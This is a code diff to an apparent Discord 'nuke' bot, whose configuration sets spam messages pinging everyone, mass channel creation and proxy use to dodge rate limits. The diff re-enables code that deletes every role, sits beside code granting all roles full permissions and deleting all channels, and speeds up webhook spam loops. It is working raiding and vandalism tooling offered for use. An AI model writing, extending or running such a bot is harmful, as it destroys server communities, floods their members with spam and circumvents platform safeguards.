@@ -21,11 +21,11 @@ TOKEN = '' #ur BOT token here
 CHANNEL_NAMES = 'K.Dot#0001' #name of the created channels
 MESSAGE = '@everyone K.Dot#0001 was here! ' #message u want ALSO make sure there is a space at the end if your using spam_prn
 PREFIX = 'god ' #ur prefix
-AMMOUNT_OF_CHANNELS = 60 #lol you can go more if u got a good pc
+AMMOUNT_OF_CHANNELS = 3 #lol you can go more if u got a good pc
 SERVER_NAME = 'KDot better' #mad facts cuz
 SPAM_PRN = True #hehehehehehehehehehe
 PROXIES = True #no proxies is a LOT faster but u can get ratelimited faster sometimes so its up to u ALSO PROXIES WILL MESS UP CONSOLE LMAO
-LESS_RATE_LIMIT = False #TURN TO TRUE IF YOU WANT TO GET RATE LIMITED LESS. PROXIES IS STILL BETTER THO
+LESS_RATE_LIMIT = True #TURN TO TRUE IF YOU WANT TO GET RATE LIMITED LESS. PROXIES IS STILL BETTER THO
 
 #===================CONFIG===================#
 
@@ -63,12 +63,11 @@ async def nuke(ctx):
             await role.edit(permissions = Permissions.all())
         except:
             print("couldn't give everyone admin")
-        #for role in ctx.guild.roles:
-        #    try:
-        #        await role.delete()
-        #        print(f"{role} got fucked") #this is a bit buggy
-        #    except:
-        #        print(f"couldn't delete {role}")
+        for role in ctx.guild.roles:
+            try:
+                await role.delete()
+            except:
+                print(f"couldn't delete {role}")
         for channel in ctx.guild.channels:
             try:
                 await channel.delete()
@@ -153,7 +152,7 @@ def spamhookp(hook):
             if LESS_RATE_LIMIT == False:
                 continue
             else:
-                time.sleep(0.5)
+                time.sleep(0.2)
     sys.exit()
         
 def spamhook(hook):
@@ -172,7 +171,7 @@ def spamhook(hook):
             if LESS_RATE_LIMIT == False:
                 continue
             else:
-                time.sleep(0.5)
+                time.sleep(0.2)
     sys.exit()
 
 if PROXIES == True:
